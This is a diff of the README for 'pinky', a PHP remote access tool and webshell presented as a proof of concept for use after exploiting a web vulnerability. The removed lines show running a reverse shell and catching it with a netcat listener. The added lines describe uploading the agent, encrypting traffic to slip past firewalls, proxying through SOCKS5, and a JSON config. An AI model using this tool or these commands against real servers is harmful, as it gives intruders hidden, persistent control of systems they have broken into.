@@ -1,38 +1,40 @@
 ## pinky
-### The (reverse) PHP mini RAT
 
-A reverse shell works by the remote computer sending its shell to a specific user, rather than binding it to a port, which would be unreachable in many circumstances. This allows run commands over the remote server.
+![pinky v2](https://github.com/davidtavarez/pinky/raw/master/screenshots/pinkyV2.png "pinky v2")
 
-**pinky** is a minimal php implementantion of a reverse remote administration tool.
+### The PHP mini RAT
 
-### Why?
+Upload a webshell is the next step after exploiting a web vulnerability, but the services like Cloudflare and the new generation of firewalls does a really good job preventing an attacker runs commands in the target via HTTP.
 
-Truth is there are a lot of implementations out there in other programming languages, but not a good one written in PHP. Most of the code makes use of the **shell_exec** function to execute commands and this is very limited. **pynky** use **proc_open** to pass  input and catch the output to send it through a socket connection.
+**pinky** is a PoC.
+
+### How pinky is different?
+
+First, **pinky** checks which function is enabled to run commands and **every communication is encrypted**, so even the Firewall is enabled to check the traffic it won't be able to know whether the activity is malicious or not. Also, pinky is able to communicate through a SOCKS5 proxy.
 
 ### How to use it.
 
-All you need is to execute the file: pynky.php using the web browser or within the CLI.
+Upload the agent and then create a json file with the settings.
 
 ```
-$ php pinky.php -a 127.0.0.1 -p 3391 -t tcp
+{
+  "key":"[KEY]",
+  "iv": "[IV]",
+  "url":"[URL]",
+  "login":{
+    "username":"root",
+    "password":"toor"
+  },
+  "proxy":{
+    "ip":"127.0.0.1",
+    "port":9150,
+    "type":"SOCKS5"
+  }
+}
 ```
 
-**Client**
-
-![pinky client](https://github.com/davidtavarez/pinky/blob/master/screenshots/pinky_client.png?raw=true "Client")
-
-**Server**
-
-![pinky server](https://github.com/davidtavarez/pinky/blob/master/screenshots/pinky_server.png?raw=true "Server")
-
-**URL**
-
-![pinky url](https://github.com/davidtavarez/pinky/blob/master/screenshots/pinky_url.png?raw=true "URL")
-
-### Using netcat (nc) ###
-
-Also you can open the reverse shell with the **nc** command, like this.
+Now, open your terminal and pass the json file as a parameter.
 
 ```
-$ nc -v -n -l -p 3391
+$ php pinky.php config.json
 ```
